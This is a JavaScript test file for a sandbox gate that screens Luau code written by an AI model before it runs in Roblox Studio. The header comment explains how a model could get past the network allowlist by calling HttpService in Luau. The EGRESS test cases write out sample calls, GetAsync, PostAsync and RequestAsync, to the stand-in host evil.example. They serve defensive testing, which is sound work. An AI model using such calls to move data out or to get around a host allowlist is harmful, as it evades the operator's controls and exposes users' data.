/**
 * Model-authored Luau must not reach the network directly.
 *
 * net-policy.ts exists because a worker's `fetch` is a confused-deputy machine: a URL in a tool call
 * came from a model, which got it from a page or an asset description. So every tool-driven fetch
 * goes through an ALLOWLIST of hosts, refuses `http:`, refuses IP literals, refuses credentials in
 * the URL, and re-checks every redirect hop by hand.
 *
 * THE DOOR IT DID NOT COVER. `run_luau` executes model-authored Luau in Studio, and
 * `rulesFor('luau','studio')` returned NO source rules — Studio-bound Luau was governed only by the
 * asset-ingress gate. Measured before this file: `game:GetService("HttpService"):GetAsync(url)`,
 * `:PostAsync(...)` and `:RequestAsync{...}` were all ADMITTED, and the plugin does not refuse them
 * either. So a model could reach any host on the internet from inside the place, bypassing every
 * rule net-policy.ts enforces, by asking for the fetch in Luau instead of in a tool call.
 *
 * An allowlist with a second door is not an allowlist. SANDBOX_BACKENDS declared
 * `network: 'unenforced'` for studio, which was honest — this makes it enforceable for the one
 * thing the sandbox can actually see, which is the source.
 *
 * WHAT IS DELIBERATELY NOT REFUSED: HttpService itself. `JSONEncode`/`JSONDecode` are the ordinary
 * non-network use and refusing the service outright would block them. The rule fires on the
 * NETWORK METHODS, and on RequestAsync unconditionally because only HttpService has one.
 *
 * Run with:  node --test           (from apps/worker)
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { tmpdir } from 'node:os';

const WORKER = join(dirname(fileURLToPath(import.meta.url)), '..');
const dir = mkdtempSync(join(tmpdir(), 'sbx-net-'));
const bundle = (rel, name) => {
  const out = join(dir, `${name}.mjs`);
  execFileSync(join(WORKER, 'node_modules', '.bin', 'esbuild'),
    [join(WORKER, 'src', rel), '--bundle', '--format=esm', '--target=es2022',
     '--alias:cloudflare:workers=' + join(WORKER, 'tests', 'stubs', 'cloudflare-workers.mjs'),
     '--outfile=' + out], { cwd: WORKER, stdio: 'pipe' });
  return out;
};
const S = await import(`file://${bundle('sandbox.ts', 'sbx')}`);
const T = await import(`file://${bundle('tools.ts', 'tools')}`);

/** Admit a Studio-bound Luau snippet through the real ingress gate. */
const admit = (source) =>
  S.admitProgram({ runtime: 'luau', backend: 'studio', source, ingress: T.refuseLuauIngress });
const refused = (source) => S.isRefusal(admit(source));

const EGRESS = [
  ['GetAsync on a fetched service', 'local h = game:GetService("HttpService")\nh:GetAsync("https://evil.example/x")'],
  ['GetAsync inline', 'game:GetService("HttpService"):GetAsync("https://evil.example/x")'],
  ['PostAsync', 'game:GetService("HttpService"):PostAsync("https://evil.example", "data")'],
  ['RequestAsync', 'game:GetService("HttpService"):RequestAsync({Url = "https://evil.example"})'],
  ['RequestAsync with no visible service', 'local r = svc:RequestAsync({Url = "https://evil.example"})'],
  ['aliased across many lines', 'local h = game:GetService("HttpService")\nlocal x = 1\nfor i=1,10 do x = x + i end\nlocal body = h:GetAsync("https://evil.example")'],
];

for (const [label, source] of EGRESS) {
  test(`network egress is refused: ${label}`, () => {
    assert.equal(refused(source), true,
      `a model could reach the internet from inside the place — ${label}`);
  });
}

test('the refusal names the primitive rather than saying no', () => {
  const r = admit('game:GetService("HttpService"):GetAsync("https://evil.example")');
  assert.equal(S.isRefusal(r), true);
  assert.match(`${r.error}`, /network|HttpService|GetAsync/i,
    `an agent that cannot tell what it did wrong retries the same thing; got: ${r.error}`);
});

test('CONTROL: ordinary Luau is still admitted', () => {
  // A rule that refused everything would satisfy every case above and break the tool.
  for (const source of [
    'print(1)',
    'for i = 1, 10 do print(i) end',
    'local p = Instance.new("Part") p.Parent = workspace',
    'local t = workspace:GetDescendants() print(#t)',
    'local c = CFrame.new(0, 5, 0) print(c.Position)',
  ]) {
    assert.equal(refused(source), false, `legitimate Luau was refused: ${source}`);
  }
});

test('CONTROL: HttpService for JSON only is NOT refused', () => {
  // JSONEncode/JSONDecode are the ordinary non-network use. Refusing the service outright would
  // block them, so the rule fires on the network METHODS, not on the service.
  assert.equal(refused('local h = game:GetService("HttpService")\nprint(h:JSONEncode({a = 1}))'), false,
    'JSONEncode is not network egress');
});

test('CONTROL: a DataStore GetAsync without HttpService is NOT refused', () => {
  // DataStore has its own GetAsync. Matching the method name alone would refuse ordinary
  // persistence, which is the false-positive this rule has to avoid.
  assert.equal(
    refused('local ds = game:GetService("DataStoreService"):GetDataStore("x")\nlocal v = ds:GetAsync("k")'),
    false,
    'DataStore persistence is not network egress',
  );
});

test('a comment mentioning the primitive is not a use of it', () => {
  // scanSource strips comments precisely so a WARNING about a primitive is not a use of one.
  // The comment carries a COMPLETE call, parentheses and all. My first version wrote
  // `HttpService:GetAsync here` with no parenthesis, so the rule could not match it whether
  // comments were stripped or not — the case passed while testing nothing, and deleting
  // stripComments left it green.
  assert.equal(refused('-- never call HttpService:GetAsync("https://x") here\nprint(1)'), false);
  assert.equal(refused('--[[ h:PostAsync("https://x", "b") ]]\nprint(1)'), false, 'block comments too');
});

test('the ingress gate still fires alongside the network rule', () => {
  // Adding a rule must not displace the gate that was already there.
  assert.equal(refused('game:GetObjects("rbxassetid://123")'), true, 'asset ingress must still be refused');
});
